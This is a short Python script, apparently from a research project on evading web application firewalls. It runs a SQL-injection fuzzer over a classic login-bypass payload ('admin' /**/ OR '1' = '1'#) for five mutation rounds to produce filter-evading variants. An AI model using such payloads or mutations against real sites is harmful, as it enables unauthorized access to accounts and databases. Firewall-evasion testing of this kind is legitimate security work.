import sys
sys.path.append("/home/edward/Documents/WAF_A_MOLE/WAF_A_MoLE/Fuzzer")

from sqlifuzzer import SQLiFuzzer

payload = "admin' /**/ OR '1' = '1'#"

fuzzer = SQLiFuzzer(payload)

#mutate in 5 rounds
for i in range(5):
    fuzzer.mutate()

print(fuzzer.payload)
